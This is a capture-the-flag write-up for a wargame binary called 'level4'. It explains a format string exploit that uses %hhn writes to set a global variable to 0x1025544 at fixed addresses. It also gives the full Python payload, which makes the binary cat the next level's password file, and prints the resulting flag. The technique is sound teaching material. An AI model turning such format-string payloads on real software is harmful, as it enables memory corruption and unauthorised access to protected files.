# level4

We find an executable `level4`. We examine it in Cutter. We determine it's similar to `level3` ; we'll have to exploit `%n` to set a variable to a specific value.

However, something's different this time : the number to write with `%n` is too big, we can't write that many bytes.

However, we can still take advantage of `%n`, using the `h` flag : `%hn` is for `short int`, and `%hhn` for `short short int` which allows us to write a one-byte value.

Here's what we'll do : we'll break down the 4-byte int, specify the 4 bytes as individual addresses and fill them with the corresponding byte.

## **The value**

Cutter reveals our variable should have the value `0x1025544`.

This can be broken down in four :
- `0x01` or `1`
- `0x02` or `2`
- `0x55` or `85`
- `0x44` or `68`

The `%n` count doesn't reset, so we'll write the total in ascending order. We'll need to write `1` char and fill the first byte ; write `1` char and fill the second byte ; write `66` chars and fill the last byte ; and write `17` chars and fill the third byte.

## **The address**

Cutter tells us the variable to change.

Running `info variable` in `gdb` yields us `m`'s address : `0x08049810`.

This gives us our four addresses (without forgetting to reverse the order for endianness) :

- Write value `0x01` to address `0x08049813`
- Write value `0x02` to address `0x08049812`
- Write value `0x55` to address `0x08049811`
- Write value `0x44` to address `0x08049810`

## **The buffer**

Quick experimentation reveals the beginning of the buffer is at spot `%12$`.

We'll want our buffer to look like the following :

```
12   13   14   15   16   17   18   19   20   21
AAAA BBBB CCCC DDDD EEEE FFFF GGGG HHHH IIII JJJJ

22   23   24   25   26   27   28   29   30   31
KKKK LLLL MMMM NNNN OOOO PPPP QQQQ RRRR SSSS TTTT

32   33   34   35   36   37   38   39   40
UUUU VVVV WWWW XXXX YYYY ZZZZ ++++ ---- ....
```

We write our `%??$hhn` after `1`, `2`, `68` and `85` bytes written (don't forget `%??$hhn` doesn't count as written bytes) :

```
12   13   14   15   16   17   18   19   20   21
A%?? $hhn C%?? $hhn EEEE FFFF GGGG HHHH IIII JJJJ

22   23   24   25   26   27   28   29   30   31
KKKK LLLL MMMM NNNN OOOO PPPP QQQQ RRRR SSSS TTTT

32   33   34   35   36   37   38   39   40
UU%? ?$hh nWWW XXXX YYYY ZZZZ ++%? ?$hh n...
```

We add our addresses in spots `20-23` :

```
12   13   14   15   16   17   18   19   20         21
A%?? $hhn C%?? $hhn EEEE FFFF GGGG HHHH 0x08049810 0x08049811

22         23         24   25   26   27   28   29   30   31
0x08049812 0x08049813 MMMM NNNN OOOO PPPP QQQQ RRRR SSSS TTTT

32   33   34   35   36   37   38   39   40
UU%? ?$hh nWWW XXXX YYYY ZZZZ ++%? ?$hh n...
```

Now all that's left is replacing each `??` with the index of the address you wanna fill each value with :

```
12   13   14   15   16   17   18   19   20         21
A%23 $hhn C%22 $hhn EEEE FFFF GGGG HHHH 0x08049810 0x08049811

22         23         24   25   26   27   28   29   30   31
0x08049812 0x08049813 MMMM NNNN OOOO PPPP QQQQ RRRR SSSS TTTT

32   33   34   35   36   37   38   39   40
UU%2 0$hh nWWW XXXX YYYY ZZZZ ++%2 1$hh n...
```

## **The exploit**

We turn that into something we can output in Python :

```
python -c 'print("A%23$hhnC%22$hhnEEEEFFFFGGGGHHHH\x10\x98\x04\x08\x11\x98\x04\x08\x12\x98\x04\x08\x13\x98\x04\x08MMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUU%20$hhnWWWXXXXYYYYZZZZ++%21$hhn...")'
```

After a little cleanup, we get :

```
python -c 'print("_%23$hhn_%22$hhn________________\x10\x98\x04\x08\x11\x98\x04\x08\x12\x98\x04\x08\x13\x98\x04\x08__________________________________%20$hhn_________________%21$hhn")'
```

## **The flag**

Now we just have to pipe that to `level4`, who directly runs `system ("/bin/cat /home/user/level5/.pass");`

```
python -c 'print("_%23$hhn_%22$hhn________________\x10\x98\x04\x08\x11\x98\x04\x08\x12\x98\x04\x08\x13\x98\x04\x08__________________________________%20$hhn_________________%21$hhn")' | ./level4
```

It works ! We get the `level4` flag :

```
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```